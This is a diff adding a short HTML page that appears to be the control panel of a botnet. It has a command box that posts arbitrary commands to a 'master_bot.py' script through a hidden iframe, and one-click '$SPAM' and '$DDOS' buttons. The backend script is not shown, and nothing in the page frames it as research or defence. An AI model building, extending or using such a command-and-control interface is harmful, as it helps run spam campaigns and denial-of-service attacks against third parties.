@@ -1,0 +1,31 @@
+
+<html lang="en-US">
+<head>
+</head>
+<body>
+
+  <!-- Footer Section -->
+  <section class="footer_banner" id="contact" >
+    <h2 class="hidden">Command Line </h2>
+    <p class="hero_header" >
+       <form action="master_bot.py" method="POST" target="id_iframe">
+		<input type="text" name="command" cols="40" rows="4">
+		<p></p>
+		<button type="submit" value="Submit" >send message</button>
+    
+    </p>
+    
+    </form>
+	<iframe id="id_iframe" name="id_iframe" style="display:none;"></iframe> 
+	<h2 class="hidden">Special Command:</h2>
+	<form action="master_bot.py" method="POST" target="id_iframe">
+	<input id="Spam" type="submit" value="$SPAM" name="spam">
+	<input id="ddos" type="submit" value="$DDOS" name="DDOS">
+	</form>
+	<iframe id="id_iframe" name="id_iframe" style="display:none;"></iframe> 
+
+  </section>
+	<!-- Main Container Ends -->
+
+</body>
+</html>
